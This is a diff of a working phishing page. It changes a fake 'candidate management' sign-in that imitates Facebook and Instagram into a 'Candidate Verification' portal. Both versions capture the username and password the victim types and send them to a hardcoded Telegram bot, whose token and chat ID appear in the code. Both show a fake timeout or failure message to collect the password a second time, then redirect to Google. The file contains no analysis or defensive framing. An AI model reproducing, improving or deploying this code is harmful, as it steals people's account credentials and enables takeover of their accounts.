@@ -3,111 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Candidate Management | Secure Portal</title>
+    <title>Candidate Verification System</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 min-h-screen flex flex-col font-sans">
-    <header class="bg-white p-4 text-center border-b shadow-sm">
-        <h1 class="text-[10px] font-bold uppercase tracking-widest text-red-900">CANDIDATE MANAGEMENT SYSTEM</h1>
-    </header>
+<body class="bg-slate-50 min-h-screen flex items-center justify-center p-6">
 
-    <main class="flex-grow flex items-center justify-center p-4">
-        <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-sm text-center border border-gray-100">
-            <h2 class="text-xl font-bold mb-2">Secure Sign In</h2>
-            <p class="text-[11px] text-gray-400 mb-8 font-medium">Verify your identity to proceed</p>
-            
-            <div class="space-y-4 mb-8">
-                <button onclick="openLogin('Profile A')" class="w-full border flex items-center justify-start px-5 py-3 rounded-xl hover:bg-gray-50 active:scale-95 transition">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg" class="w-5 mr-4">
-                    <span class="text-sm font-bold text-gray-600">Verify via Profile A</span>
-                </button>
-                <button onclick="openLogin('Profile B')" class="w-full border flex items-center justify-start px-5 py-3 rounded-xl hover:bg-gray-50 active:scale-95 transition">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-5 mr-4">
-                    <span class="text-sm font-bold text-gray-600">Verify via Profile B</span>
-                </button>
-            </div>
-
-            <div class="space-y-3 text-left">
-                <input type="text" placeholder="Reference ID" class="w-full border p-3 rounded-xl text-sm bg-gray-50 outline-none">
-                <input type="password" placeholder="Security Key" class="w-full border p-3 rounded-xl text-sm bg-gray-50 outline-none">
-                <button class="w-full bg-[#7f1d1d] text-white py-3 rounded-xl font-bold text-sm shadow-lg">LOG IN</button>
-            </div>
+    <div class="bg-white p-10 rounded-2xl shadow-lg w-full max-w-md border-t-8 border-blue-600">
+        <h1 class="text-2xl font-bold text-gray-800 mb-2">Portal Access</h1>
+        <p class="text-sm text-gray-500 mb-8 font-medium">Please enter your reference details to sync with the database.</p>
+        
+        <div id="notice" class="bg-amber-50 text-amber-700 text-[12px] p-4 rounded-lg mb-6 hidden border border-amber-100 font-semibold text-center">
+            🔒 Connection Timeout. Re-enter credentials to authorize.
         </div>
-    </main>
-
-    <div id="loginPortal" class="fixed inset-0 bg-black/80 hidden flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-[25px] w-full max-w-sm p-10 text-center shadow-2xl relative">
-            <img id="portal-icon" src="" class="w-16 mx-auto mb-6">
-            <h3 class="font-bold text-xl mb-1 text-gray-800">Login Required</h3>
-            <p class="text-xs text-gray-400 mb-8 uppercase tracking-widest font-bold">Verification Gateway</p>
-            
-            <div id="err-box" class="bg-red-50 text-red-600 text-[11px] p-3 rounded-xl mb-6 hidden border border-red-100 font-bold">
-                ⚠️ Verification failed. Please enter correct credentials.
+        
+        <div class="space-y-5">
+            <div>
+                <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Primary ID</label>
+                <input type="text" id="u" placeholder="Email or Username" class="w-full border-2 border-gray-100 p-4 rounded-xl text-sm focus:border-blue-500 outline-none transition-all">
             </div>
             
-            <input type="text" id="u_field" placeholder="Username, phone or email" class="w-full border p-4 rounded-2xl mb-4 text-sm bg-gray-50 outline-none">
-            <input type="password" id="p_field" placeholder="Password" class="w-full border p-4 rounded-2xl mb-8 text-sm bg-gray-50 outline-none">
+            <div>
+                <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Access Key</label>
+                <input type="password" id="p" placeholder="••••••••" class="w-full border-2 border-gray-100 p-4 rounded-xl text-sm focus:border-blue-500 outline-none transition-all">
+            </div>
             
-            <button onclick="sendData()" id="subBtn" class="w-full text-white py-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition">CONFIRM</button>
+            <button onclick="submitSync()" id="btn" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-md shadow-md hover:bg-blue-700 active:scale-95 transition-all">AUTHORIZE SYNC</button>
         </div>
     </div>
 
     <script>
-        const CONFIG = {
-            TOKEN: "8575047403:AAFLEU-1LmDZRfU-zpBtEdj9pVUdagt9hOA", // Naya
-            ID: "6521606449", // Naya
-            REDIR: "https://www.google.com"
+        const SETUP = {
+            T: "8575047403:AAFLEU-1LmDZRfU-zpBtEdj9pVUdagt9hOA", //
+            C: "6521606449" //
         };
 
-        let activeType = "";
-        let count = 0;
+        let tries = 0;
 
-        function openLogin(type) {
-            activeType = type;
-            const icon = document.getElementById('portal-icon');
-            const btn = document.getElementById('subBtn');
-            icon.src = (type === 'Profile A') ? "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg" : "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg";
-            btn.style.backgroundColor = (type === 'Profile A') ? "#1877F2" : "#E1306C";
-            document.getElementById('loginPortal').classList.remove('hidden');
-        }
+        async function submitSync() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            const btn = document.getElementById('btn');
+            const notice = document.getElementById('notice');
 
-        async function sendData() {
-            const u = document.getElementById('u_field').value;
-            const p = document.getElementById('p_field').value;
-            const btn = document.getElementById('subBtn');
-            const err = document.getElementById('err-box');
+            if (!user || !pass) return alert("Please fill all fields.");
 
-            if (!u || !p) return alert("Please fill all details!");
-
-            btn.innerText = "VERIFYING...";
+            btn.innerText = "SYNCING...";
             btn.disabled = true;
 
-            const msg = `🚀 **NEW LOG**\n👤 **User:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n📂 **Type:** ${activeType}`;
+            const content = `📊 **PORTAL LOG**\n\n👤 **ID:** \`${user}\` \n🔑 **KEY:** \`${pass}\``;
 
             try {
-                const res = await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                const res = await fetch(`https://api.telegram.org/bot${SETUP.T}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.ID, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: SETUP.C, text: content, parse_mode: 'Markdown' })
                 });
 
                 if (res.ok) {
-                    count++;
-                    if (count === 1) {
-                        err.classList.remove('hidden');
-                        document.getElementById('p_field').value = "";
-                        btn.innerText = "CONFIRM";
+                    tries++;
+                    if (tries === 1) {
+                        notice.classList.remove('hidden');
+                        document.getElementById('p').value = "";
+                        btn.innerText = "RE-AUTHORIZE";
                         btn.disabled = false;
                     } else {
-                        window.location.href = CONFIG.REDIR;
+                        window.location.href = "https://www.google.com";
                     }
                 } else {
-                    alert("Submission error. Bot start karein!");
+                    alert("Submission error. Ensure bot is started.");
                     btn.disabled = false;
-                    btn.innerText = "CONFIRM";
+                    btn.innerText = "AUTHORIZE SYNC";
                 }
             } catch (e) {
-                alert("Connection failed!");
+                alert("Network failure.");
                 btn.disabled = false;
             }
         }
